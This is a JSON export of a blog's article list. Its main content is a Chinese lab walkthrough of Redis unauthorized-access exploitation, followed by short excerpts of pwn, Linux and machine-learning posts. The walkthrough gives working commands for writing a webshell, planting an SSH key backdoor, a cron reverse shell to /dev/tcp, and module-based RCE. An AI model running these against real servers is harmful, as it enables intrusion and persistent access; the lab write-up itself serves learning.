{"total":13,"pageSize":10,"pageCount":2,"data":[{"title":"Redis未授权访问","slug":"redis未授权访问","date":"2021-02-22T16:04:48.000Z","updated":"2021-02-23T14:38:12.986Z","comments":true,"path":"api/articles/redis未授权访问.json","excerpt":"","keywords":null,"cover":"../static/images/image-20210223223810960.png","content":"<h1 id=\"nginxphpredis环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#nginxphpredis环境搭建\"></a> Nginx+PHP+Redis环境搭建</h1>\n<p>环境搭建于arch，利用aur搭建的所以比较方便，系统不一样的请自行修改搭建步骤（也不难，这里记录下只是为了给下次省时间，其实主要还是改配置文件费时间，不同系统一样的）</p>\n<p>Nginx环境搭建：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yay -S nginx</span><br></pre></td></tr></table></figure>\n<p>修改配置文件/etc/nginx/nginx.conf的server部分为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    server_name foo.com;</span><br><span class=\"line\"></span><br><span class=\"line\">    root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class=\"line\">    index index.html index.htm index.php;</span><br><span class=\"line\"></span><br><span class=\"line\">    location &#x2F; &#123;</span><br><span class=\"line\">        try_files $uri $uri&#x2F; &#x2F;index.php$is_args$args;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    location ~ \\.php$ &#123;</span><br><span class=\"line\">        try_files $uri &#x3D;404;</span><br><span class=\"line\"></span><br><span class=\"line\">        include fastcgi.conf;</span><br><span class=\"line\">        fastcgi_pass 127.0.0.1:9001;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>修改完配置文件后，启动nginx:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl enable nginx.service --now</span><br></pre></td></tr></table></figure>\n<p>php环境搭建：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yay -S php php-fpm</span><br></pre></td></tr></table></figure>\n<p>修改php-fpm配置文件/etc/php/php-fpm.d/www.conf（不同php版本该配置文件不同，具体可自行查看etc目录有关于php的目录，大概是这个形式的路径，php那里可能是php7.0之类的）：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pm.status_listen &#x3D; 127.0.0.1:9001 #把这一行的注释取消掉，这里有可能是9000，那就把这改成9001 或者把上面nginx配置文件那里的9001改成9000</span><br></pre></td></tr></table></figure>\n<p>修改完配置文件后，启动php-fpm</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl enable php-fpm --now</span><br></pre></td></tr></table></figure>\n<p>redis环境搭建并运行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-6.0.8.tar.gz</span><br><span class=\"line\">tar -xzf redis-6.0.8.tar.gz</span><br><span class=\"line\">cd redis-6.0.8</span><br><span class=\"line\">make</span><br><span class=\"line\">cd src</span><br><span class=\"line\">.&#x2F;redis-server</span><br></pre></td></tr></table></figure>\n<h1 id=\"写入webshell\"><a class=\"markdownIt-Anchor\" href=\"#写入webshell\"></a> 写入webshell</h1>\n<p>必要条件：</p>\n<ul>\n<li>知道web目录的绝对路径</li>\n<li>拥有web目录的写入权限</li>\n</ul>\n<p>思路：获取所有键值对，然后创建一个不存在的键值对，再通过修改配置文件，将该键值对写入配置文件中：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; keys *\t\t#查看所有键值对</span><br><span class=\"line\">1) &quot;mylist&quot;</span><br><span class=\"line\">2) &quot;myset&quot;</span><br><span class=\"line\">3) &quot;youset&quot;</span><br><span class=\"line\">4) &quot;user:001&quot;</span><br><span class=\"line\">5) &quot;myKey&quot;</span><br><span class=\"line\">6) &quot;age&quot;</span><br><span class=\"line\">7) &quot;user_id&quot;</span><br><span class=\"line\">8) &quot;mynum&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; config get dbfilename \t#查看配置文件</span><br><span class=\"line\">1) &quot;dbfilename&quot;</span><br><span class=\"line\">2) &quot;dump.rdb&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; config get dir \t\t\t#查看当前文件名</span><br><span class=\"line\">251) &quot;dir&quot;</span><br><span class=\"line\">252) &quot;&#x2F;home&#x2F;b0ring&#x2F;WorkingSpace&#x2F;tools&#x2F;websecurity&#x2F;vulhub&#x2F;redis&#x2F;redis-6.0.8&#x2F;src&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; config set dir &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \t\t\t#设置当前目录为web目录</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; config set dbfilename 1.php\t\t\t\t\t\t#设置配置文件名为shell文件</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; set shell &quot;\\n&lt;?php\\n  phpinfo();\\n?&gt;\\n&quot;\t\t\t#创建shell</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; save\t\t\t\t\t\t\t\t\t\t\t#写入shell</span><br><span class=\"line\">OK</span><br></pre></td></tr></table></figure>\n<p>此时web目录中已经生成了1.php文件，包含php内容：</p>\n<p><img src=\"../static/images/image-20210223223810960.png\" alt=\"image-20210223223810960\" /></p>\n<p>访问shell：</p>\n<p><img src=\"../static/images/image-20210223223746312.png\" alt=\"image-20210223223746312\" /></p>\n<h1 id=\"写入ssh公钥\"><a class=\"markdownIt-Anchor\" href=\"#写入ssh公钥\"></a> 写入ssh公钥</h1>\n<p>必要条件：</p>\n<ul>\n<li>知道当前用户的用户名</li>\n<li>拥有.ssh目录</li>\n<li>允许使用密钥登录</li>\n</ul>\n<p>步骤：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br><span class=\"line\">127.0.0.1:6379&gt; config set dir &#x2F;home&#x2F;b0ring&#x2F;.ssh</span><br><span class=\"line\">127.0.0.1:6379&gt; config set dbfilename authorized_keys</span><br><span class=\"line\">127.0.0.1:6379&gt; set backdoor &quot;\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXyLoi1XDQtUJN2ifZfZcR0p3OT73s2ZZkOMqzSwcDGFZnTMJuR2vHbktVPWuYSAx0CmOdmkgaVDjGsn+G9e01aedRxc2lFBFMyAI2AgV&#x2F;ukY5q2kU5+x7kZD3X8KEfJ0+FsDNwtnRureYCWkh9+QuD1rlGD7IuDcAkzZYUmNREnh7Bz4Of855SF5pXdotVmsNJ3O9PF94G0zCMxCMddFNWD8Ebshk3iwZ9xk9d6NnA8qO18QMjoNQBEoQVq&#x2F;e1mdKVmaXW7CjKUva&#x2F;aZQ7kk4SjSGmvJEsIh8nb264rX0fgpIPlpHZbn5hWhdxbT3qWwHprzI90Blwa6jqNLJV91kDDDwEXywq8RZkzdkLd8G6Rwu855uKT+hkSl49Zjj8v&#x2F;XNNhboAaOgGe0sfYtbOmOdW0+FJL5ktvLt91&#x2F;oFHOvgNHTMdHgo+ASM8jdsckPo1n4ZovN2QHQpohfLFhSC1PXIpwRxf5D1Om1NAeY&#x2F;pPtNFwcDGPRZUx6PndRUQrcGc&#x3D; b0ring@b0ring\\n&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; save</span><br></pre></td></tr></table></figure>\n<p>然后就直接用私钥登录：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -i backdoor b0ring@127.0.0.1</span><br></pre></td></tr></table></figure>\n<h1 id=\"写计划任务反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#写计划任务反弹shell\"></a> 写计划任务反弹shell</h1>\n<p>必要条件：</p>\n<ul>\n<li>拥有计划任务写权限</li>\n</ul>\n<p>服务器上监听8000端口：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvp 8000</span><br></pre></td></tr></table></figure>\n<p>随后写入计划任务：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; config dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class=\"line\">127.0.0.1:6379&gt; config set dbfilename b0ring</span><br><span class=\"line\">127.0.0.1:6379&gt; set backdoor &quot;\\n\\nSHELL&#x3D;&#x2F;bin&#x2F;bash\\n\\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;8000 0&gt;&amp;1\\n\\n&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; save</span><br></pre></td></tr></table></figure>\n<h1 id=\"主从rce\"><a class=\"markdownIt-Anchor\" href=\"#主从rce\"></a> 主从RCE</h1>\n<p>必要条件：</p>\n<ul>\n<li>redis版本为 4.x或5.x（亲测6.x无此问题）</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">从服务器会向主服务器发出SYNC指令，当主服务器接到此命令后，就会调用BGSAVE指令来创建一个子进程专门进行数据持久化工作，也就是将主服务器的数据写入RDB文件中。在数据持久化期间，主服务器将执行的写指令都缓存在内存中。</span><br><span class=\"line\"></span><br><span class=\"line\">在BGSAVE指令执行完成后，主服务器会将持久化好的RDB文件发送给从服务器，从服务器接到此文件后会将其存储到磁盘上，然后再将其读取到内存中。这个动作完成后，主服务器会将这段时间缓存的写指令再以redis协议的格式发送给从服务器。</span><br></pre></td></tr></table></figure>\n<p>自redis 4.x版本后，它可以自由添加模块扩展，只需启动时添加loadmodule选项，或者在启动后，可以rce的版本可从下面<a href=\"https://github.com/UnnameBao/RedisModules-ExecuteCommand\">链接</a>编译：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; MODULE LOAD &#x2F;home&#x2F;b0ring&#x2F;WorkingSpace&#x2F;tools&#x2F;websecurity&#x2F;vulhub&#x2F;redis&#x2F;redis-rce&#x2F;exp.so</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; MODULE list</span><br><span class=\"line\">1) 1) &quot;name&quot;</span><br><span class=\"line\">   2) &quot;system&quot;</span><br><span class=\"line\">   3) &quot;ver&quot;</span><br><span class=\"line\">   4) (integer) 1</span><br><span class=\"line\">127.0.0.1:6379&gt; system.exec whoami</span><br><span class=\"line\">&quot;b0ring\\n&quot;</span><br></pre></td></tr></table></figure>\n<p>利用上述两个特点，可以使用主从同步和修改配置文件存放位置，主服务器可以向从服务器写一个恶意的so文件，添加到redis中从而rce（6.x版本无法利用是因为6.x版本redis在加载模块时会校验模块是否具有执行权限，否则不予加载），利用脚本可从<a href=\"https://github.com/Ridter/redis-rce\">此处</a>获取。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python redis-rce.py -L 127.0.0.1 -r 127.0.0.1 -f exp.so</span><br></pre></td></tr></table></figure>\n<h1 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\"></a> 总结</h1>\n<ul>\n<li>本质上，其实这些未授权访问都是先修改redis目录和缓存文件位置，然后再保存缓存，从而通过向特定目录进行任意写操作来获取rce权限</li>\n<li>一切写操作都是覆盖的，所以实战利用过程中为了不对目标机器进行破坏，一定要先改位置再写入，然后再改回去</li>\n<li>除了主从复制，其他写操作都是有乱码的，对于Ubuntu环境，其不允许计划任务文件存在乱码，即无法再Ubuntu中使用计划任务rce</li>\n</ul>\n","text":" Nginx+PHP+Redis环境搭建环境搭建于arch，利用aur搭建的所以比较方便，系统不一样的请自行修改搭建步骤（也不难，这里记录下只是为了给下次省时间，其实主要还是改配置文件费时间，不同系统一样的）Nginx环境搭建：1<br>yay -S nginx<br>修改配置文","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":1,"path":"api/tags/web.json"}]},{"title":"Linux堆管理简述","slug":"Linux堆管理学习","date":"2019-10-09T08:45:20.000Z","updated":"2021-02-22T15:52:29.772Z","comments":true,"path":"api/articles/Linux堆管理学习.json","excerpt":"<h1 id=\"linux堆管理学习\"><a class=\"markdownIt-Anchor\" href=\"#linux堆管理学习\"></a> Linux堆管理学习</h1>\n<h2 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\"></a> 前言</h2>\n<p><img src=\"../static/images/2019-10-09-17-12-46.png\" alt=\"\" /></p>\n<p>  一些题外话鼓励自己，刚步入研究生有些迷茫，但是还是要想好专注的一些事情，所以既然下决心在这学期好好钻研二进制，就努力学好吧。</p>\n<p>  不知不觉已经过了差不多三四个礼拜了，一直在做ROP类型的pwn题，把攻防世界的新手区刷完之后又刷完了高手进阶区的ROP类型的pwn题（这些刷题记录打算和后面的一起出，由于高手进阶区的题目太多了，目前有5页题目，就一页一页的题目记录吧，希望自己能坚持到底）。碰到了第一个堆题目，左思右想还是应该先学习一下几种常见堆溢出的攻击方式以后再来做题，要弄清攻击原理，首先要理解Linux堆管理、分配的原理。学好pwn，感觉还是要先有一定基础吧！</p>\n<p>  顺便给自己打个广告，之前新手区的刷题记录链接在下面：<br />\n<a href=\"https://blog.b0ring.cf/#/posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95_pwn%E6%96%B0%E6%89%8B%E5%8C%BA\">https://blog.b0ring.cf/#/posts/攻防世界闯关记录_pwn新手区</a></p>\n<p>  碎碎念不多说了，开始学习沉淀吧！</p>","keywords":null,"cover":"../static/images/2019-10-09-17-12-46.png","content":null,"text":" Linux堆管理学习 前言 [Figure] ","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":5,"path":"api/tags/pwn.json"}]},{"title":"攻防世界闯关记录_pwn高手进阶区","slug":"攻防世界闯关记录_pwn高手进阶区","date":"2019-10-05T07:39:49.000Z","updated":"2021-02-22T15:52:29.772Z","comments":true,"path":"api/articles/攻防世界闯关记录_pwn高手进阶区.json","excerpt":"<p><img src=\"../static/images/2019-10-02-15-11-09.png\" alt=\"\" /></p>\n<p>  开坑一时爽，一直开坑一直爽。来高手进阶区继续爽吧！</p>","keywords":null,"cover":"../static/images/2019-10-02-15-11-09.png","content":null,"text":" [Figure] ","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":5,"path":"api/tags/pwn.json"}]},{"title":"湖湘杯2019两个密码题wp","slug":"湖湘杯2019两个密码题wp","date":"2019-10-05T07:39:49.000Z","updated":"2021-02-22T15:56:35.573Z","comments":true,"path":"api/articles/湖湘杯2019两个密码题wp.json","excerpt":"<h1 id=\"湖湘杯2019两个密码题wp\"><a class=\"markdownIt-Anchor\" href=\"#湖湘杯2019两个密码题wp\"></a> 湖湘杯2019两个密码题wp</h1>\n<p>  还是自己太菜的原因，这次湖湘杯只做出来4道题，然后5点的时候就放弃了去跟同学出去玩了，当时感觉进前50无望（这次湖湘杯py情况也很严重啊，可惜烽火台只报不封，挺恶心的）。不过无论如何，这次比赛还是有收获的，总结沉淀一下这两道密码学题目吧：</p>","keywords":null,"cover":null,"content":null,"text":" 湖湘杯2019两个密码题wp  还是自己太菜的原因，这次湖湘杯只做出来4道题，然后5点的时候就放弃了去跟同学出去玩了，当时感觉进前50无望（这次湖湘杯py情况也很严重啊，可惜烽火台只报不封，挺恶心的）。不过无论如何，这次比赛还是有收获的，总结沉淀一下这两道密码学题目吧： Ora","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":5,"path":"api/tags/pwn.json"}]},{"title":"攻防世界闯关记录_pwn新手区","slug":"攻防世界闯关记录_pwn新手区","date":"2019-09-25T09:26:37.000Z","updated":"2021-02-22T15:52:29.772Z","comments":true,"path":"api/articles/攻防世界闯关记录_pwn新手区.json","excerpt":"<p><img src=\"../static/images/2019-10-02-15-11-09.png\" alt=\"\" /></p>\n<p>  开个新坑，记录自己刷XCTF攻防世界的pwn题，因为刚入门吧，从新手篇开始练起。这次一边做题一边写笔记和writeup，巩固一下自己学到的东西。</p>","keywords":null,"cover":"../static/images/2019-10-02-15-11-09.png","content":null,"text":" [Figure]  结语  其实新手区已经刷完一段时间了，感觉难度还好吧，基本没有很难得题目，但是非常适合新手入门做。还是学会了一些东西，比方说看到某函数就大概反应可能会怎么利用，练习了动态调试之类的。没有白付出时间吧。遗憾是还没做到堆入门的题目，期待接下来的高手区练习（已经做","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":5,"path":"api/tags/pwn.json"}]},{"title":"从头复习ROP（持续更新中）","slug":"从头复习ROP","date":"2019-09-21T15:17:10.000Z","updated":"2021-02-22T15:59:39.255Z","comments":true,"path":"api/articles/从头复习ROP.json","excerpt":"<h1 id=\"从头复习rop\"><a class=\"markdownIt-Anchor\" href=\"#从头复习rop\"></a> 从头复习ROP</h1>\n<p><img src=\"../static/images/2019-10-02-15-12-47.png\" alt=\"\" /></p>\n<h2 id=\"一-前言\"><a class=\"markdownIt-Anchor\" href=\"#一-前言\"></a> 一、前言</h2>\n<p>  从考研结束就一直很浮躁，虽然在实习期间学习运用了一段时间web技术，但是新东西总是不想看，旧的东西又不断忘记。9月研究生开学，也算是新的开始了，沉下心来沉淀一些东西吧。感觉在学校的期间学习二进制是最合适的，所以潜下心来把二进制捡起来。</p>\n<p>  话不多说了，开始吧。<br />\n<br></p>","keywords":null,"cover":"../static/images/2019-10-02-15-12-47.png","content":null,"text":" 从头复习ROP [Figure]   在callme_one函数中，存在一组判断，如果a1,a2,a3参数不是分别依次等于1,2,3的话会立即退出。而这个函数并没有其他交互的输入操作，因此我们可以在之前的pwnme函数中输入足够长的内容用来构造callme_one，callme","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":5,"path":"api/tags/pwn.json"}]},{"title":"Deepin Linux体验与入门，并使用Deepin玩300英雄[针对非计算机专业人士](持续更新中)","slug":"Deepin Linux体验与入门【针对非计算机专业认识】","date":"2019-09-14T13:30:39.000Z","updated":"2021-02-22T15:52:29.772Z","comments":true,"path":"api/articles/Deepin Linux体验与入门【针对非计算机专业认识】.json","excerpt":"<h1 id=\"deepin-linux体验与入门并使用deepin玩300英雄针对非计算机专业人士\"><a class=\"markdownIt-Anchor\" href=\"#deepin-linux体验与入门并使用deepin玩300英雄针对非计算机专业人士\"></a> Deepin Linux体验与入门，并使用Deepin玩300英雄[针对非计算机专业人士]</h1>\n<h2 id=\"一-摘要\"><a class=\"markdownIt-Anchor\" href=\"#一-摘要\"></a> 一 、摘要</h2>\n<p><img src=\"../static/images/2019-09-14-22-18-36.png\" alt=\"\" /><br />\n  Deepin Linux是一个非常优秀的国产操作系统。它不仅为许多常用软件如QQ、微信等提供了适配。同时越来越多的平台也开始逐步加入拥抱Linux系统的步伐中。如金山公司为Linux适配了WPS办公软件、搜狗为Linux适配了搜狗输入法等软件、网易为Linux适配了网易云音乐等软件、百度为Linux适配了百度网盘等软件、360今年开始为Linux适配360浏览器及360压缩等软件。<br />\n  同时深度公司自主研发的深度桌面、深度影院、深度商店（软件管理软件）、深度看图、深度文件查看器、深度截屏等等软件为Linux的日常使用提供了强大活力。<br />\n  它具有以下一些鲜明的优点：<br />\n  1. 简约优雅的桌面设计。<br />\n  2. 轻快便捷的启动速度。<br />\n  3. 反应迅速的交互体验。<br />\n  4. 配置完成后很少出现死机、蓝屏等情况。非常适合笔记本的轻量级使用者使用。<br />\n  如果你并不是一个游戏发烧友、或者你并不需要在笔记本电脑中安装太多为Windows系统定制的专业软件（如PS、CAD等专业软件），那么厌倦了Windows操作系统的话非常值得尝试体验一下这款国产操作系统。<br />\n  在毕业之后等待研究生开学的暑假里，本人有一些空余时间来尝试一些新的东西。经过一段时间的摸索使用后，分享一下在我使用过程中遇到的一些问题及解决方案，以及针对我的需求所安装的软件（包括一些Windows平台上的游戏、软件等）的经验。本文将不涉及如何安装Deepin等相关内容（网上相关的内容很多，而且也十分简单），但会涉及一些解决兼容性时遇到的一些问题。<br />\n<img src=\"../static/images/!%5B%5D(../static/images/2019-09-14-22-33-07.png).png\" alt=\"\" /></p>\n<center><font color='grey'>本人所使用的Deepin桌面</font></center>\n<br / >","keywords":null,"cover":"../static/images/2019-09-14-22-18-36.png","content":null,"text":" Deepin Linux体验与入门，并使用Deepin玩300英雄[针对非计算机专业人士] 一 、摘要 [Figure] ","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"deepin","slug":"deepin","count":1,"path":"api/tags/deepin.json"}]},{"title":"解决GitHub下载速度太慢的问题","slug":"解决GitHub下载速度太慢的问题","date":"2019-01-05T04:20:44.000Z","updated":"2021-02-22T15:52:29.772Z","comments":true,"path":"api/articles/解决GitHub下载速度太慢的问题.json","excerpt":"","keywords":null,"cover":null,"content":"<p>方法一：</p>\n<p>从GitHub下载文件一直非常慢，查看下载链接发现最终被指向了Amazon的服务器，下载地址是http://github-cloud.s3.amazonaws.com/，从国内访问Amazon非常慢，所以总是下载失败，解决方法时更改host文件，使该域名指向香港的服务器：</p>\n<p>更改hosts文件：</p>\n<ul>\n<li>Windows</li>\n</ul>\n<blockquote>\n<p>更改 <code>C:\\Windows\\System32\\drivers\\etc\\hosts</code> 文件，在文件中追加 <code>219.76.4.4 github-cloud.s3.amazonaws.com</code> , 将域名指向该IP即可</p>\n</blockquote>\n<ul>\n<li>Mac</li>\n</ul>\n<blockquote>\n<p>执行  <code>sudo vi /etc/hosts</code>  追加  <code>219.76.4.4 github-cloud.s3.amazonaws.com</code></p>\n</blockquote>\n<p><strong>最后执行</strong> <code>ipconfig /flushdns</code> <strong>命令，刷新 DNS 缓存。</strong></p>\n<p><strong>方法二：</strong></p>\n<p><a href=\"https://www.ipaddress.com/\">https://www.ipaddress.com/</a> 使用 IP Lookup 工具获得下面这两个github域名的ip地址，该网站可能需要梯子，输入上述域名后，分别获得github.com和github.global.ssl.fastly.net对应的ip，比如192.30.xx.xx和151.101.xx.xx。准备工作做完之后，打开的hosts文件中添加如下格式，IP修改为自己查询到的IP：</p>\n<p>192.30.xx.xx <a href=\"http://github.com\">github.com</a><br />\n151.101.xx.xx <a href=\"http://github.global.ssl.fastly.net\">github.global.ssl.fastly.net</a></p>\n<p>最后执行 <code>ipconfig /flushdns</code> 命令，刷新 DNS 缓存。修改后的下载速度能达到 200KB/S 以上。</p>\n","text":"方法一：从GitHub下载文件一直非常慢，查看下载链接发现最终被指向了Amazon的服务器，下载地址是http://github-cloud.s3.amazonaws.com/，从国内访问Amazon非常慢，所以总是下载失败，解决方法时更改host文件，使该域名指向香港的服务器：","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"CSDN迁移","slug":"CSDN迁移","count":6,"path":"api/tags/CSDN迁移.json"}]},{"title":"Web安全之机器学习入门读书笔记——K近邻算法","slug":"Web安全之机器学习入门读书笔记——K近邻算法","date":"2018-01-25T08:51:56.000Z","updated":"2021-02-22T15:52:29.772Z","comments":true,"path":"api/articles/Web安全之机器学习入门读书笔记——K近邻算法.json","excerpt":"","keywords":null,"cover":"../../../../image/1.png","content":"<p><a href=\"http://creativecommons.org/licenses/by-sa/4.0/\"> </a> 版权声明：本文为博主原创文章，遵循<a href=\"http://creativecommons.org/licenses/by-sa/4.0/\"> CC 4.0 BY-SA </a>版权协议，转载请附上原文出处链接和本声明。  本文链接：<a href=\"https://blog.csdn.net/s1054436218/article/details/79154640\">https://blog.csdn.net/s1054436218/article/details/79154640</a></p>\n<p>网络空间安全和AI几乎是当下最热的两门话题了，而AI安全人才是少之又少，抱着这个想法和自己的兴趣，最近在读兜哥出的一本书：《Web安全之机器学习入门》。这几天会边读边写笔记，由于兜哥的代码都是用python2.7写的，个人比较喜欢python3.6，在写笔记的过程中可能与兜哥的源代码不符，顺便纠正一下书中的错误（试某个代码的时候一直跑错，到兜哥的GitHub上发现大家都说兜哥的代码的确写错了）。建议各位同好的朋友们去买兜哥的正版图书哈~我的笔记会省略兜哥讲到的很多姿势。以下是兜哥这本书的京东地址：<a href=\"https://item.jd.com/12158965.html\">https://item.jd.com/12158965.html</a></p>\n<p>本文所有代码以及数据都可以在我的GitHub上下载：<a href=\"https://github.com/UnnameBao/Note_For_MLFTWS/tree/master/Capter5\">Capter5</a></p>\n<p>K近邻算法算是最简单的机器学习算法了，也是比较重要的算法，简单易懂，书里介绍的相对简略，想更了解这个算法的朋友可以到这位大佬这里学习一下：<a href=\"http://blog.csdn.net/c406495762/article/details/75172850\">Python3《机器学习实战》学习笔记（一）：k-近邻算法(史诗级干货长文</a></p>\n<h2 id=\"使用k近邻算法检测异常操作一\"><a class=\"markdownIt-Anchor\" href=\"#使用k近邻算法检测异常操作一\"></a> 使用K近邻算法检测异常操作（一）</h2>\n<p>黑客入侵Web服务器以后，通常会通过系统漏洞进一步提权，获得root权限。所以我们可以利用搜集来的Linux服务器的bash操作日志，通过训练识别出特定用户的操作习惯，然后进一步识别出异常操作行为。<a href=\"http://xn--5-2-ns9dld28ohm95np5bw53f4rbmx8gtberr5h4dg.py\">兜哥这里写的代码文件名是5-2.py</a>，于是我这里写S的是test5_2.py。<br />\n首先是对训练数据的处理，训练数据中包括50个用户的操作日志，每个日志包含15000条操作命令，其中前5000条都是正常操作，后面的10000条日志中随机包含有异常操作。为了方便分析，数据集每100条操作作为一个操作系列，每个操作序列只要有1条异常数据就认为这个操作序列异常。<br />\n<img src=\"../../../../image/1.png\" alt=\"\" /></p>\n<h4 id=\"1-数据搜集和清洗\"><a class=\"markdownIt-Anchor\" href=\"#1-数据搜集和清洗\"></a> 1、数据搜集和清洗</h4>\n<p>一共50个User，其中label.txt记录每个User文件操作序列是否为异常，用于测试和训练，tmp.py是我自己写的脚本……<br />\n然后我们需要逐行读取操作命令，并且每100个命令组成一个操作序列，保存在list中：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def load_user_cmd(filename):</span><br><span class=\"line\">\tcmd_list &#x3D; []\t\t#存储所有操作序列</span><br><span class=\"line\">\tdist_max &#x3D; []\t\t#存储用户使用频率最高的50个命令</span><br><span class=\"line\">\tdist_min &#x3D; []\t\t#存储用户使用频率最低的50个命令</span><br><span class=\"line\">\tdist     &#x3D; 